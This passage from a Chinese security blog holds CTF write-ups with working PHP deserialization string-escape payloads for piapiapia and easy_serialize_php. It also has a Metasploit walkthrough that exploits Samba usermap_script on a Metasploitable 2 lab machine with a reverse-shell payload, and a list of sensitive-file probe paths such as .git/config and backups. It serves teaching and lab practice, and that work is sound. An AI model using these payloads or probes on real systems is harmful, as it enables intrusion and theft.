class="hljs-string">&#x27;profile&#x27;</span>, $new_profile, $where);&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;&#125;</code></pre><p>两个参数都被**filter()**过滤，跟进一下filter函数</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$string</span>) </span>&#123;$escape = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);$escape = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $escape) . <span class="hljs-string">&#x27;/&#x27;</span>;$string = preg_replace($escape, <span class="hljs-string">&#x27;_&#x27;</span>, $string);$safe = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);$safe = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $safe) . <span class="hljs-string">&#x27;/i&#x27;</span>;<span class="hljs-keyword">return</span> preg_replace($safe, <span class="hljs-string">&#x27;hacker&#x27;</span>, $string);&#125;</code></pre><p>此函数将array里的关键字全部替换成hacker，但它处理的字符串是反序列化后的，而且经过处理之后，字符串的某一部分会加长，但描述其长度的数字没有改变（该数字由反序列化时变量的属性决定），就有可能导致PHP在按该数字读取相应长度字符串后，本来属于该字符串的内容逃逸出了该字符串的管辖范围。故我们可以利用字符串逃逸构造payload,我们的目的是将<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>插入序列化的字符串里面去，这个的长度为34，所以我们要挤出来34位，where会替换成hacker，长度加1，所以我们要构造34个where：</p><p><code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;i:1;s:5:&quot;world&quot;;&#125;</code></p><p><code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>前面要多加一个}是因为我们nickname构造成了数组，而不是字符，所以要加}闭合</p><p>在update.php随意输入信息抓包</p><p><img src="/2021/03/03/wei3/8.jpg" alt="8"></p><p>将得到profile.php将图片路径解码即可得到flag。</p><p>总结：piapiapia这道题看似安全地把危险字符串<code>‘select‘, ‘insert‘, ‘update‘, ‘delete‘,  ‘where‘</code>替换成<code>‘hacker‘</code>，但我们写入where时会被替换成hacker之后字符串实际的长度就+1，因此实际的长度大于序列化固定的长度（变量前面‘s’里的值）反而导致了反序列化字符串逃逸。</p><h4 id="安洵杯-2019-easy-serialize-php（过滤后字符减少）"><a class="header-anchor" href="#安洵杯-2019-easy-serialize-php（过滤后字符减少）">🍭</a>[安洵杯 2019]easy_serialize_php（过滤后字符减少）</h4><p><img src="/2021/03/03/wei3/10.png" alt="10"></p><p>payload1:值逃逸，这儿需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对:</p><p>先构造：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$_SESSION[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;&#123;1&#125;&#x27;</span>;$_SESSION[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;&#123;2&#125;&#x27;</span>;$_SESSION[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<span class="hljs-keyword">echo</span> serialize($_SESSION);</code></pre><p>正常序列化的结果：</p><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;&#123;1&#125;&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;&#123;2&#125;&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</code></pre><p>{1}和{2}是我们可以控制的点</p><p>那么我们可以构造一个这样的$_SESSION[function]</p><pre><code class="hljs routeros"><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span><span class="hljs-attribute">ZDBnM19mMWFnLnBocA</span>==&quot;;&#125;</code></pre><p>而之前的filter函数将php flag都替换为空，那么我们就可以使$_SESSION[user]=&quot;“中字符串的长度等于”;s:8:“function”;s:41:&quot;一共23位<br>故</p><pre><code class="hljs autoit">$_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]=<span class="hljs-string">&quot;flagflagflagflagphpflag&quot;</span></code></pre><p>综合</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]=<span class="hljs-string">&quot;flagflagflagphpflagflag&quot;</span>;$_SESSION[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;$_SESSION[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<span class="hljs-keyword">echo</span> serialize($_SESSION);</code></pre><p>序列化结果为</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">23</span>:<span class="hljs-string">&quot;flagflagflagphpflagflag&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">41</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>Z<span class="hljs-number">3</span>Vlc<span class="hljs-number">3</span>RfaW<span class="hljs-number">1</span>nLnBuZw==<span class="hljs-string">&quot;;&#125;</span></code></pre><p>由于经过filter函数的处理，变为</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">23</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">41</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>Z<span class="hljs-number">3</span>Vlc<span class="hljs-number">3</span>RfaW<span class="hljs-number">1</span>nLnBuZw==<span class="hljs-string">&quot;;&#125;</span></code></pre><p>反序列化结果为：</p><pre><code class="hljs ocaml"><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;       [<span class="hljs-string">&quot;user&quot;</span>]=&gt;<span class="hljs-built_in">string</span>(<span class="hljs-number">23</span>)<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">41</span>:<span class="hljs-string">&quot;&quot;</span>     [<span class="hljs-string">&quot;img&quot;</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">20</span>) <span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span> &#125;</code></pre><p>但是经过反序列化之后，原来是三个键值，但这里只有两个键值，无法反序列化成功，所以我们需要自己再加上一个键值<br>故最终</p><pre><code class="hljs smalltalk"><span class="hljs-string">$_</span>SESSION[<span class="hljs-string">&#x27;function&#x27;</span>]=<span class="hljs-comment">&quot;&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-comment">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-comment">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-comment">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-comment">&quot;a&quot;</span>&#125;<span class="hljs-comment">&quot;</span><span class="hljs-comment">1</span></code></pre><p>故传入参数</p><pre><code class="hljs monkey">_SESSION[user]=flagflagflagphpflagflag&amp;_SESSION[<span class="hljs-function"><span class="hljs-keyword">function</span>] =</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:1:&quot;</span>a<span class="hljs-string">&quot;;&#125;</span></code></pre><p>payload2:键逃逸</p><p>payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[flagphp]=;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</code></pre><pre><code class="hljs smalltalk"><span class="hljs-string">$_</span>SESSION[<span class="hljs-string">&#x27;phpflag&#x27;</span>]=<span class="hljs-comment">&quot;;s:1:\&quot;</span><span class="hljs-number">1</span>\<span class="hljs-comment">&quot;;s:3:\&quot;</span>img\<span class="hljs-comment">&quot;;s:20:\&quot;</span><span class="hljs-type">ZDBnM19mMWFnLnBocA</span>==\<span class="hljs-comment">&quot;;&#125;&quot;</span>;<span class="hljs-string">$_</span>SESSION[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);var_dump( serialize(<span class="hljs-string">$_</span>SESSION) );#<span class="hljs-comment">&quot;a:2:&#123;s:7:&quot;</span>phpflag<span class="hljs-comment">&quot;;s:48:&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-comment">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-comment">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-comment">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="hljs-comment">&quot;</span><span class="hljs-comment">;s:3:&quot;</span>img<span class="hljs-comment">&quot;;s:20:&quot;</span><span class="hljs-type">Z3Vlc3RfaW1nLnBuZw</span>==<span class="hljs-comment">&quot;;&#125;&quot;</span></code></pre><p>经过filter过滤后phpflag就会被替换成空，<code>s:7:&quot;phpflag&quot;;s:48:&quot; </code>就变成了<code> s:7:&quot;&quot;;s:48:&quot;;</code>即完成了逃逸。两个键值分别被序列化成了<code>s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;</code>即键名叫<code>&quot;;s:48: </code>对应的值为一个字符串1。<br><code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>键名img对应的字符串是<code>d0g3_f1ag.php</code>的base64编码。<br>右花括号后面的<code>;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</code>全被遗弃了。</p><p>将<code>payload</code>POST传入后得到一个文件</p><p><img src="/2021/03/03/wei3/11.jpg" alt="11"></p><p>将文件名编码再次传入即可得到flag</p><h2 id="总结"><a class="header-anchor" href="#总结">🍭</a>总结</h2><p>字符串逃逸问题经常是先序列化某个变量，然后再经过一个过滤函数，然后再反序列化，这样子过滤函数会替换掉一些关键词，就会造成反序列化的对象逃逸问题。</p><p>参考：</p><p><a href="https://blog.csdn.net/qq_43431158/article/details/108210822?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242">浅析php反序列化字符串逃逸</a></p><p><a href="http://www.bubuko.com/infodetail-3388907.html">[0CTF 2016]piapiapia解题详细思路及复现</a></p><p><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">[安洵杯 2019]easy_serialize_php</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit(一)——入门测试</title>
    <link href="/2021/02/27/wei1/"/>
    <url>/2021/02/27/wei1/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介">🍭</a>简介</h2><p>Metasploit框架(Metasploit Framework，MSF)是一个开源工具，由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。</p><p>Metasploit可向后端模块提供多种用来控制测试的接口（如控制台、Web、CLI)推荐使用控制台接口，通过控制台接口，你可以访问和使用所有Metasploit的插件，例如Payload、利用模块、Post模块等。Metasploit还有第三方程序的接口，例如Nmap,SQLMap……</p><p>MSF框架由多个模块构成：</p><table><thead><tr><th>模块</th><th>功能</th></tr></thead><tbody><tr><td>Auxiliaries(辅助模块)</td><td>该模块不会直接在测试者和目标主机之间建立访问，只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</td></tr><tr><td>Exploit(漏洞利用模块)</td><td>漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。流行的渗透攻击技术包括缓冲区溢出、Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码。</td></tr><tr><td>Payload(攻击载荷模块)</td><td>攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等。</td></tr><tr><td>Post(后期渗透模块)</td><td>模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。</td></tr><tr><td>Encoders(编码工具模块)</td><td>该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、IDS及类似的安全软件检测出来</td></tr></tbody></table><h3 id="常用命令"><a class="header-anchor" href="#常用命令">🍭</a>常用命令</h3><p>直接help可查询</p><p><img src="/2021/02/27/wei1/2.jpg" alt="2"></p><p>好好学英语😔😔😔</p><h4 id="msfconsole"><a class="header-anchor" href="#msfconsole">🍭</a>msfconsole</h4><pre><code class="hljs properties"><span class="hljs-meta">?</span>             <span class="hljs-string">显示帮助菜单</span><span class="hljs-attr">back</span>          <span class="hljs-string">从当前环境返回到主路径</span><span class="hljs-attr">banner</span>        <span class="hljs-string">显示软件旗标信息</span><span class="hljs-attr">cd</span>            <span class="hljs-string">改变当前工作路径</span><span class="hljs-attr">color</span>         <span class="hljs-string">切换颜色</span><span class="hljs-attr">connect</span>       <span class="hljs-string">连接主机，类似于telnet和nc</span><span class="hljs-attr">exit</span>          <span class="hljs-string">退出</span><span class="hljs-attr">help</span>          <span class="hljs-string">显示帮助菜单，即该页面</span><span class="hljs-attr">info</span>          <span class="hljs-string">显示模块的详细信息</span><span class="hljs-attr">irb</span>           <span class="hljs-string">进入irb脚本模式</span><span class="hljs-attr">jobs</span>          <span class="hljs-string">显示和管理作业</span><span class="hljs-attr">kill</span>          <span class="hljs-string">结束一个作业</span><span class="hljs-attr">load</span>          <span class="hljs-string">加载framework插件</span><span class="hljs-attr">loadpath</span>      <span class="hljs-string">从指定路径加载模块</span><span class="hljs-attr">quit</span>          <span class="hljs-string">退出</span><span class="hljs-attr">resource</span>      <span class="hljs-string">运行文件中的命令</span><span class="hljs-attr">route</span>         <span class="hljs-string">Route traffic through a session</span><span class="hljs-attr">save</span>          <span class="hljs-string">保持数据</span><span class="hljs-attr">search</span>        <span class="hljs-string">搜索模块及名称</span><span class="hljs-attr">sessions</span>      <span class="hljs-string">显示及转存会话列表</span><span class="hljs-attr">set</span>           <span class="hljs-string">设置变量值</span><span class="hljs-attr">setg</span>          <span class="hljs-string">设置全局变量值</span><span class="hljs-attr">show</span>          <span class="hljs-string">显示给定类型的模块或全部模块</span><span class="hljs-attr">sleep</span>         <span class="hljs-string">休眠</span><span class="hljs-attr">unload</span>        <span class="hljs-string">卸载 framework 插件</span><span class="hljs-attr">unset</span>         <span class="hljs-string">取消变量设置</span><span class="hljs-attr">unsetg</span>        <span class="hljs-string">取消全局变量设置</span><span class="hljs-attr">use</span>           <span class="hljs-string">根据名字选择一个模块</span><span class="hljs-attr">version</span>       <span class="hljs-string">显示版本</span><span class="hljs-attr">advanced</span>      <span class="hljs-string">显示一个或多个模块的高级选项</span><span class="hljs-attr">clearm</span>        <span class="hljs-string">清除模块栈</span><span class="hljs-attr">listm</span>         <span class="hljs-string">列出模块堆栈</span><span class="hljs-attr">options</span>       <span class="hljs-string">显示一个或多个模块的全局选项</span><span class="hljs-attr">popm</span>          <span class="hljs-string">从堆栈中弹出最新的模块并使其处于活动状态</span><span class="hljs-attr">previous</span>      <span class="hljs-string">将先前加载的模块设置为当前模块</span><span class="hljs-attr">pushm</span>         <span class="hljs-string">将活动模块或模块列表推入模块堆栈</span><span class="hljs-attr">reload_all</span>    <span class="hljs-string">从所有定义的模块路径中重新加载所有的模块</span><span class="hljs-attr">search</span>        <span class="hljs-string">搜索模块名称和描述</span><span class="hljs-attr">show</span>          <span class="hljs-string">显示给定类型的模块或所有模块</span><span class="hljs-attr">log</span>           <span class="hljs-string">如果可能的话，将显示框架.log页面显示到末尾</span><span class="hljs-attr">pry</span>           <span class="hljs-string">打开当前模块或框架上的撬调试器</span><span class="hljs-attr">reload_lib</span>    <span class="hljs-string">从指定的路径重新加载Ruby库文件</span><span class="hljs-attr">db_add_host</span>   <span class="hljs-string">添加一个或多个主机到数据库</span><span class="hljs-attr">db_add_note</span>   <span class="hljs-string">添加一个注释到主机</span><span class="hljs-attr">db_add_port</span>   <span class="hljs-string">添加一个端口到主机</span><span class="hljs-attr">db_connect</span>    <span class="hljs-string">连接一个存在的数据库</span><span class="hljs-attr">db_create</span>     <span class="hljs-string">创建一个新的数据库实例</span><span class="hljs-attr">db_del_host</span>   <span class="hljs-string">从数据库删除一个或多个主机</span><span class="hljs-attr">db_del_port</span>   <span class="hljs-string">从数据库删除一个端口</span><span class="hljs-attr">db_destroy</span>    <span class="hljs-string">删除一个存在的数据库</span><span class="hljs-attr">db_disconnect</span> <span class="hljs-string">断开与当前数据库实例的连接</span><span class="hljs-attr">db_driver</span>     <span class="hljs-string">指定一个数据库驱动</span><span class="hljs-attr">db_hosts</span>      <span class="hljs-string">列出数据库中的所有主机</span><span class="hljs-attr">db_nmap</span>       <span class="hljs-string">执行Nmap并记录输出</span><span class="hljs-attr">db_notes</span>      <span class="hljs-string">列出数据库中的所有注释</span><span class="hljs-attr">db_services</span>   <span class="hljs-string">列出数据库中的所有服务</span><span class="hljs-attr">db_vulns</span>      <span class="hljs-string">列出数据库中的所有漏洞</span><span class="hljs-attr">db_workspace</span>  <span class="hljs-string">转换数据库工作区</span><span class="hljs-attr">db_import_ip_list</span>     <span class="hljs-string">引入一个IP列表文件</span><span class="hljs-attr">db_import_amap_mlog</span>   <span class="hljs-string">引入一个THC-Amap扫描结果文件(-o -m)</span><span class="hljs-attr">db_import_nessus_nbe</span>  <span class="hljs-string">引入一个Nessus扫描结果文件(NBE)</span><span class="hljs-attr">db_import_nessus_xml</span>  <span class="hljs-string">引入一个Nessus扫描结果文件</span><span class="hljs-attr">db_import_nmap_xml</span>    <span class="hljs-string">引入一个Nmap扫描结果文件(-oX)</span><span class="hljs-attr">db_autopwn</span>            <span class="hljs-string">自动利用</span></code></pre><h3 id="初级测试"><a class="header-anchor" href="#初级测试">🍭</a>初级测试</h3><p>接下来用Metasploitable 2靶机进行测试</p><h4 id="先用nmap查看系统开放端口和相关应用程序"><a class="header-anchor" href="#先用nmap查看系统开放端口和相关应用程序">🍭</a>先用nmap查看系统开放端口和相关应用程序</h4><p>通常使用<code>nmap –sV IP(或者域名)</code>，如果机器设置有防火墙禁ping，可以使用nmap -P0(或者-Pn) –sV IP(或者域名)来查看主机的开放情况</p><p><img src="/2021/02/27/wei1/3.jpg" alt="3"></p><p>可以看到靶机开放的端口，开放状态，服务类型，和版本号，其中渗透最重要的两个参数是开放状态和版本号。版本号也就是系统扫描中，在开发安全扫描件里经常提及的漏洞指纹，因为大部分漏洞的产生就是某一版本的问题。我们此次要攻击139端口，如图中，可以看到服务的指纹信息，主要就是服务名称和版本号，是samba的服务，处于3.X-4.X版本。</p><h4 id="搜索Samba的exploit"><a class="header-anchor" href="#搜索Samba的exploit">🍭</a>搜索Samba的exploit</h4><p><img src="/2021/02/27/wei1/1.jpg" alt="1"></p><p>利用返回的结果中各个漏洞被利用的难易程度选择漏洞，这里我选<code>exploit/multi/samba/usermap_script</code>因为它难度较低。一般有限选择excellent和great两种等级，因为稳定且效果明显，其次就是后面的描述是否和我们攻击的服务有关</p><h4 id="查询漏洞详细信息"><a class="header-anchor" href="#查询漏洞详细信息">🍭</a>查询漏洞详细信息</h4><p><img src="/2021/02/27/wei1/4.jpg" alt="4"></p><p>使用该exploit，查看exploit下的payloads(如果是知道使用哪个模块，可以输入每个 / 后的前2-4个字母使用table补齐)</p><p><img src="/2021/02/27/wei1/5.jpg" alt="5"></p><p>选择攻击载荷的时候，建议选用和meterpreter和reverse相关的载荷(由于攻击的目标机可能处在内网里，攻击的时候存在端口映射等方面的问题，使用反弹可以更稳定)这次就用<code>cmd/unix/reverse</code></p><h4 id="接下来查看需要填写的参数"><a class="header-anchor" href="#接下来查看需要填写的参数">🍭</a>接下来查看需要填写的参数</h4><p><img src="/2021/02/27/wei1/7.jpg" alt="7"></p><blockquote><p><strong>Tips:</strong></p><p>在真实的环境中，RPORT可能并不是默认的参数，由于一个服务是放在内网当中，他通过路由器转发，可能会出现端口的变化（端口映射）<br>exploit target也是非常重要的参数，可通过show targets，查看目标系统有哪些.<br>查看目标的系统，可以使用：nmap –O IP，然后使用set target ID选择目标类型，主要用于增加成功</p></blockquote><p>其中只有RHOST是空，我们需要自己填上该信息</p><p><img src="/2021/02/27/wei1/6.jpg" alt="6"></p><p>现在就可以发动攻击，执行任意命令</p><p><img src="/2021/02/27/wei1/8.jpg" alt="8"></p><p>入门的测试就完成辽❤️❤️❤️</p><h3 id="后记"><a class="header-anchor" href="#后记">🍭</a>后记</h3><p>由于本篇记录入门测试，故选择的靶机也较为基础，实战中目标主机的很多信息都需要收集，无法像本篇文章用到的靶机一样可以直接获取信息，后渗透测试改天再学习👻👻👻</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Information Exposure</title>
    <link href="/2021/02/24/everything/"/>
    <url>/2021/02/24/everything/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a class="header-anchor" href="#概述">🍭</a>概述</h2><p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到：</p><ul><li><p>通过访问url下的目录，可以直接列出目录下的文件列表</p></li><li><p>输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息</p></li><li><p>前端的源码（<code>html,css,js</code>）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等</p></li></ul><p>敏感信息泄露往往给攻击着实施进一步的攻击提供很大的帮助，漏洞出现的位置、造成的危害有很大的差异性。</p><h2 id="类型"><a class="header-anchor" href="#类型">🍭</a>类型</h2><h4 id="网络信息泄露"><a class="header-anchor" href="#网络信息泄露">🍭</a>网络信息泄露</h4><ul><li><p>DNS域传送漏洞</p></li><li><p>运维监控系统弱口令、网络拓扑泄露</p><p>zabbix弱口令、zabbix sql注入……</p></li></ul><h4 id="WEB敏感信息"><a class="header-anchor" href="#WEB敏感信息">🍭</a>WEB敏感信息</h4><ul><li><p>phpinfo()信息泄露</p></li><li><p>测试页面泄露在外网</p></li></ul><p><code> test.cgi、phpinfo.php、info.php</code>等</p><ul><li>编辑器备份文件泄露在外网</li></ul><p><code>http://[ip]/.test.php.swp</code></p><p><code> http://[ip]/test.php.bak</code></p><p><code> http://[ip]/test.jsp.old</code></p><p><code> http://[ip]/cgi~</code></p><p>常见编辑器备份后缀</p><ul><li>版本管理工具(如git)文件信息泄露</li></ul><p><code>http://[ip]/.git/config</code></p><p><code> http://[ip]/CVS/Entriesp</code></p><p><code>http://[ip]/.svn/entriesp</code></p><p><code>http://[ip]/.svn/wc.db</code></p><ul><li>HTTP认证泄露漏洞</li></ul><p><code>http://[ip]/basic/index.php</code></p><p>Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码</p><ul><li>管理后台地址泄露</li></ul><p><code> http://[ip]/login.php</code></p><p><code> http://[ip]/admin.php</code></p><ul><li><p>错误页面暴露信息</p><p>错误页面由服务器产生403、404、500等错误时，返回详细错误信息。报错信息中可能会包含服务器代码信息、数据库连接信息、SQL语句或者敏感文件的路径</p><p><strong>检测</strong>：</p><p>1.通过目录扫描或手工输入不存在的文件或路径，触发服务器产生404错误并返回404页面</p><p>2.通过目录扫描或手工输入一个无权限查看的文件或路径，触发服务器产生403错误并返回403页面</p><p>3.手工输入不存在的参数或特殊构造的字符串，如单引号，尖括号等，触发服务器产生500错误并返回500页面或异常信息。</p></li><li><p>服务器探针文件</p></li><li><p>存在可访问的管理控制台入口</p><p>Web 控制台是一种基于 Web 的用户界面，  其常常被用于网站后台或者web容器。控制台中，其不仅仅局限于容器或者网站管理后台，还包括一些数据库默认地址等。在web安全中，网站系统在泄漏其web容器（中间件）或者数据库的控制台后，存在增加被入侵的风险。常见的web控制台：<code>tomcat、aria2、weblogic、websphere、oracle、jboss……</code>web的容器控制台常见访问形式：<code>http://host:port/load/</code></p><p><strong>检测</strong>：</p><p>思路为首先需识别网站容器的指纹，判断其所采用的中间件，然后去扫描其所开放的端口，根据开放端口信息和常见固定的路径，去判断其控制台地址。</p></li><li><p>存在可访问的管理后台入口(应该比较少见)</p><p>应用存在未限制访问的后台，或者能直接登录管理后台,或利用上传功能上传webshell，导致服务器被控制</p><p><strong>检测</strong>：</p><ol><li><p>可以利用web漏洞扫描器或目录扫描器扫描web应用进行检测</p></li><li><p>识别网站使用的cms框架，判断其默认的管理后台地址。</p></li><li><p>在网站中寻找管理后台超链接</p></li></ol></li><li><p>默认页面泄漏</p><p>存在默认安装中间件、插件、框架等会携带示例页面及说明文档</p></li><li><p>入侵痕迹残留</p><p>在渗透过程中发现应用中存在曾经的入侵痕迹，如存在的webshell文件。残留的入侵痕迹可被其他攻击者用于二次攻击.</p><p><strong>检测</strong>：</p><p>通常使用Web应用安全漏洞扫描工具或目录扫描工具发现入侵痕迹</p></li><li><p>HTTP头信息泄漏</p><p>在服务器返回的HTTP头中泄露服务器信息</p><p><strong>检测</strong>:</p><ol><li><p>在浏览器的调试窗口中查看HTTP响应头</p></li><li><p>使用代理软件如burpsuite、fiddler，拦截HTTP响应头</p></li></ol></li><li><p>物理路径泄漏</p><p>应用中泄露出应用在主机中的绝对地址路径。</p><p><strong>检测</strong>：</p><ol><li><p>打开网页源代码，查看图片等媒体的链接及超链接；</p></li><li><p>通过报错信息获取</p></li></ol></li><li><p>历史文件残留</p><p>应用遗留的过时文件、备份页面、渗透测试遗留文件、开发文件残留的测试文件</p></li><li><p><code>robots.txt</code></p><p>搜索引擎可以通过robots文件可以获知哪些页面可以爬取，哪些页面不可以爬取。</p><p>Robots协议是网站国际互联网界通行的道德规范，其目的是保护网站数据和敏感信息、确保用户个人信息和隐私不被侵犯，如果robots.txt文件编辑的太过详细，反而会泄露网站的敏感目录或者文件，比如网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用</p></li><li><p>网站源码备份文件</p><p>管理员备份网站文件后错误地将备份放在web目录下，常见的后缀名：<code>.rar、.zip、.7z、.tar、.tar.gz、.bak、.txt</code></p></li></ul><h4 id="tips-目录遍历"><a class="header-anchor" href="#tips-目录遍历">🍭</a>tips:目录遍历</h4><p>在web功能设计中,很多时候要将需要访问的文件定义成变量从而让前端的功能更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。如果后台没有对前端传进来的值进行严格过滤，攻击者可能会通过“…/”让后台打开或者执行一些其他的文件，导致后台服务器上其他目录的文件结果被遍历出来（跟之前讲的文件下载有点像）</p><p><em>如果通过不带参数的url（如：<code>http://xxxx/doc</code>）列出了doc文件夹里面所有的文件也称为为敏感信息泄露而不归为目录遍历漏洞</em></p><h4 id="实例"><a class="header-anchor" 